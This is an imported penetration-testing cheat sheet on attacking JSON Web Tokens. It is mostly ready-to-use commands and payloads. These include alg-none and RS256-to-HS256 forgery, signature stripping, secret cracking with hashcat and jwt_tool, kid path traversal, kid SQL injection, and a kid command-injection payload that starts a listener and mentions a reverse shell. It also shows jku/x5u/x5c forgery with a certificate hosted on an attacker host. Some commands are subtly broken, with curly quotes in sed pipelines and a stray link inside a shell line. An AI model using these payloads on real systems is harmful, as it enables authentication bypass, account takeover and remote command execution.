---
technique: "JWT"
family: "auth-session"
severity_hint: "high"
tags: ["Session Tokens", "Account Takeover", "XSS", "JavaScript", "Auth", "HTTP"]
source: "_raw/Web attacks/Web Attacks/JWT.md"
source_sha256: "c5f6e36adb4663969ccf166cd6713670eda98a31eb0facfd888cfac7769cda6b"
curator_version: 2
review_status: imported-unreviewed
---

# JWT

> Family: **auth-session** · Severity hint: **high** · Tags: Session Tokens, Account Takeover, XSS, JavaScript, Auth, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: jwt_tool, openssl, python3.

## Quick index — payloads & commands in this note
- `bash: python3 jwt_tool.py -M at \`
- `bash: python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"`
- `python: [= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `python: 1. Turn Intercept on and Login to the Web App`
- `python: 1. Turn Intercept on and Login to the Web App`
- `python: Note: This Attack will convert the workflow from Asymmetric to Symmetric encryption and no`
- `bash: openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout`
- `python: 4. Then use below command to generate JWT token.`
- `python: $ git clone https://github.com/silentsignal/rsa_sign2n`
- `bash: 1. Turn Intercept on and Login to the Web App`
- `bash: 1. Turn Intercept on and Login to the Web App`
- `bash: Use arbitrary files to verify (Path traversal / LFI)`
- `bash: For SQL injection:`
- `bash: python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem`
- `bash: For command injection:`
- `json: {`
- `json: {`
- `json: {`
- `bash: JSON Set URL (jku)`
- `bash: x5u Claim Misuse:`
- `bash: x5c Claim Misuse:`

## Playbook (operator notes)

# JWT

[Brute Force - CheatSheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#jwt)

# Workflow

1. User sign-in using username and password or google/facebook
2. Authentication server verifies the credentials and issues a jwt signed using either a secret salt or a private key
3. User’s Client uses the JWT to access protected resources by passing the JWT in HTTP Authorization header
4. Resource server then verifies the authenticity of the token using the secret salt/ public key
    
    
    

# Automated JWT Checks

```bash
python3 jwt_tool.py -M at \
    -t "https://example.com" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

# Attacking JWT

We can use Regex to search in proxy history

```python
[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*
[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*
```

### Check for sensitive data in the JWT

```python
1. Turn Intercept on and Login to the Web App
2. Forward the request until you get JWT token
3. Switch to JSON Web Token Tab 
4. Check if any user info or any sensitive info is used in the payload section
```

### None algorithm

```python
1. Turn Intercept on and Login to the Web App
2. Forward the request until you get JWT token
3. Switch to JSON Web Token Tab
4. Change "alg:" to none "alg:none" by using the Attack tab
		{
		  "alg": "none",
		  "typ": "JWT"
		}
5. Change the Payload and edit the signature to empty
		Signature = ""
6. Forward the Request
```

### Change algorithm from RS256 to HS256

```python
Note: This Attack will convert the workflow from Asymmetric to Symmetric encryption and now we can sign the new tokens with the same public key

1. Turn Intercept on and Login to the Web App
2. Forward the request until you get JWT token
3. Get the Public key from the Application (pubkey.pem file) using below commands
```

```bash
openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout
```

```python
4. Then use below command to generate JWT token.
		"python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem"
5. Use the generated token in the request and try changing payload
6. Forward the request

* This will work when web app support both algorithm
```

- If no public key is found, it can be computed from the JWTs themselves
    
    [https://github.com/silentsignal/rsa_sign2n](https://github.com/silentsignal/rsa_sign2n)
    

```python
$ git clone https://github.com/silentsignal/rsa_sign2n
$ cd rsa_sign2n/standalone/
$ docker build . -t sig2n
$ docker run -it sig2n /bin/bash
$ [o](https://app.notion.com/p/Wordlists-96a8e3defd6c413f84b47fc4c214c251?pvs=21) <jwt_1> <jwt_2>
```

- Reduce false positives by rerunning with different JWT’s
- Check the generated tokens in the application, if one of them work, there is a confusion
- Use Cyberchef’s JWT Signing function with the public key found in the container `<key>_x509.pem`
- Add a `\n` newline after the public key

### Signature not being checked

```bash
1. Turn Intercept on and Login to the Web App
2. Forward the request until you get JWT token
3. Switch to JSON Web Token Tab or JOSEPH
4. Change Payload section and Remove the Signature completely or try changing some characters in the signature
5. Done, Forward the Request
```

### Crack the secret key

- Try to crack the password via https://github.com/haxrob/gojwtcrack

```bash
1. Turn Intercept on and Login to the Web App
2. Forward the request until you get JWT token
3. If JWT-Heartbreaker Plugin is installed then a weak secret-key will directly be shown to you

3. Copy JWT Token and store it in a text file then use Hashcat to crack the Secret key using this command:
		"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force" 
		"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show" //this will show cracked secret-key

3. Use Jwt_Tool to crack the secret key using below command:
			"python3 jwt_tool.py <JWT> -C -d secrets.txt"

4. Now Use the Secret key to forge the request using jwt.io or jwt_tool with option "-p"
5. Done, Use the generated token in the requests

* You can also find leaked secret keys in the jwt.json config file.
```

### Attacks using kid in JWT token

```bash
Use arbitrary files to verify (Path traversal / LFI)
1. Turn Intercept on and Login to the Web App
2. Forward the request until you receive the JWT token
3. If the header section of the JWT token contains 'kid', forge a new JWT token using jwt_tool:
	'python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""'

Alternatively, the contents of any file in the web root, such as CSS or JS, can be used to validate the Signature:
	'python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"'

4. Manipulate the payload section and use the generated token in the request
5. Forward the request
```

```bash
For SQL injection:
1. Turn Intercept on and Login to the Web App
2. Forward the request until you receive the JWT token
3. Switch to the JSON Web Token Plugin tab and manipulate 'kid' with an SQLi payload
4. SQLi can be tried not only in 'kid' but in any field of the payload section
5. Forward the request and escalate SQLi further
```

```bash

python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem
```

```bash
For command injection:
1. Turn on Intercept in Burp and login to the Web App
2. Forward the request until you receive the JWT token
3. Switch to the JSON Web Token Plugin tab and manipulate 'kid' with OS commands payload:
	 "kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &"
	 Also check random chars "kid": "\"'(){}[]&;/'(}{'£%^"
4. Use the forged JWT token in the request
5. Check if you can connect to the server on port 1337, or use a reverse shell in the payload and check if you receive a connection back
```

### Forged Header Parameter

- **Injecting self-signed JWTs via the jku parameter**
    - Instead of embedding public keys directly using the `jwk` header parameter, some servers let you use the `jku` (JWK Set URL) header parameter to reference a JWK Set containing the key
    - When verifying the signature, the server fetches the relevant key from this URL
    - `A JWK Set is a JSON object containing an array of JWKs representing different keys`
    
    ```json
    {
    	"keys": [
    		{
    		"kty": "RSA",
    		"e": "AQAB",
    		"kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
    		"n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
    		},
    		{
    		"kty": "RSA",
    		"e": "AQAB",
    		"kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
    		"n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
    		}
    	]
    }
    
    ```
    
    - JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`
- **Injecting self-signed JWTs via the jwk parameter**
    
    The JSON Web Signature (JWS) specification describes an optional `jwk` header parameter, which servers can use to embed their public key directly within the token itself in JWK format. `A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.`
    
    - Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures
    - **Misconfigured servers** sometimes use any key that's embedded in the `jwk` parameter
    - Exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the `jwk` header
    
    ```json
    {
    	"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    	"typ": "JWT",
    	"alg": "RS256",
    	"jwk":
    	{
    		"kty": "RSA",
    		"e": "AQAB",
    		"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    		"n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    	}
    }
    
    ```
    
- **Injecting self-signed JWTs via the kid parameter**
    - Servers may use several cryptographic keys for signing different kinds of data, not just JWTs
    - For this reason, the header of a JWT may contain a `kid` (Key ID) parameter, which helps the server identify which key to use when verifying the signature
    - Verification keys are often stored as a JWK Set
    - In this case, the server may simply look for the JWK with the same `kid` as the token
    - However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing
    - For example, they might use the `kid` parameter to point to a particular entry in a database, or even the name of a file
    - If this parameter is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key
    
    ```json
    {
    	"kid": "../../path/to/file",
    	"typ": "JWT",
    	"alg": "HS256",
    	"k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
    }
    
    ```
    
    - This is especially dangerous if the server also supports JWTs signed using a symmetric algorithm
    - In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file
    - You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`
    - Signs token with empty string
    
    If you're using the JWT Editor extension, note that this doesn't let you sign tokens using an empty string. However, due to a bug in the extension, you can get around this by using a Base64-encoded null byte.
    
- **Other interesting parameters**
    - `cty` (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a `cty` header to change the content type to `text/xml` or `application/x-java-serialized-object`, which can potentially enable new vectors for [XXE](https://portswigger.net/web-security/xxe) and [deserialization](https://portswigger.net/web-security/deserialization) attacks.
    - `x5c` (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the [`jwk` header injection](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter) attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633).

```bash
JSON Set URL (jku)
1. Turn on Intercept in Burp and login to the Web App
2. Forward the request until you get JWT token
3. Decode the JWT token and check if it contents jku attribute in Header section
4. Generate a Public and Private Key pair using below commands:
		"openssl genrsa -out keypair.pem 2048"
		"openssl rsa -in keypair.pem -pubout -out publickey.crt"
		"openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key"
5. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the "Decoded" section
6. Host the generated certificate locally and modify the jku header parameter accordingly
7. Retrieve the jwks.json file from the URL present in the jku header claim
		"wget http://example.com:8000/jwks.json"
8. Create a Python script "getPublicParams.py":
		from Crypto.PublicKey import RSA

		fp = open("publickey.crt", "r")
		key = RSA.importKey(fp.read())
		fp.close()

		print "n:", hex(key.n)
		print "e:", hex(key.e)
9. Run python script "python getPublicParams.py"
10. Update the values of n and e in local jkws.json
11. Hosting the JWK Set JSON file using repl.it or any server
12. Manipulate the payload section and copy the generated jwt token from jwt.io
13. Done, change the JWT token in our request and Forward!

```

```bash
x5u Claim Misuse:
Note: The algorithm used for signing the token is “RS256”.
The token is using x5u header parameter which contains the location of the X.509 certificate to be used for token verification.

1. Turn on Intercept in Burp and login to the Web App
2. Forward the request until you get JWT token
3. Decode the JWT token and check if it contains a x5u attribute in the Header section
4. Create a self-signed certificate
			"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt"
5. Extract the public key from the generated certificate:
			"openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem"
6. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the "Decoded" section
7. Set "x5u: http://198.51.100.17:8080/attacker.crt", you can use repl.it to host that
8. Use forged jwt token in request

```

```bash
x5c Claim Misuse:
Note: The algorithm used for signing the token is “RS256”.
The token is using x5c header parameter which contains the X.509 certificate to be used for token verification.
The token has various fields: n, e, x5c, x5t, kid. 
Also, notice that kid value is equal to x5t value.

1. Turn on Intercept in Burp and login to the Web App
2. Forward the request until you get JWT token
3. Decode the JWT token and check if its contents has the x5c attribute in the Header section
* https://jwt.io automatically extracts the X.509 certificate and places it in the “Verify Signature” sub-section in “Decoded” section

4. Create a self-signed certificate:
		"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt"
5. Extract RSA public key parameters (n and e) from the generated certificate
		"openssl x509 -in attacker.crt -text"
6. Converting modulus (n) to base64-encoded hexadecimal strings
		"echo "Modules (n) value will be here"| sed ‘s/://g’ | base64 | tr ‘\n’ ‘ ‘ | sed ‘s/ //g’ | sed ‘s/=//g’"
7. Converting exponent (e) to base64-encoded hexadecimal strings
		"echo "exponent (e) here" | base64 | sed ‘s/=//g’"
8. Finding the new x5c value
		"cat attacker.crt | tr ‘\n’ ‘ ‘ | sed ‘s/ //g’"
9. Copy the contents excluding the — -BEGINCERTIFICATE — — and — — ENDCERTIFICATE — — part
8. Finding the new x5t value
		"echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | sed ‘s/SHA1 Fingerprint=//g’ | sed ‘s/://g’ | base64 | sed ‘s/=//g’"

* Note: The kid parameter would also get the same value as x5t parameter.

9. Create a forged token using all the parameters calculated in the previous step
10. Visit https://jwt.io and paste the token retrieved in Step 3 in the “Encoded” section
11. Paste the X.509 certificate (attacker.crt) and the private key (attacker.key) in their respective places in the “Decoded” section
12. Manipulate Payload section and copy the forged token
13. Replace the forged token in the request and forward
```

---

[JWT](https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt)

[JWT Vulnerabilities (Json Web Tokens)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)

## Source
Original note: `_raw/Web attacks/Web Attacks/JWT.md`
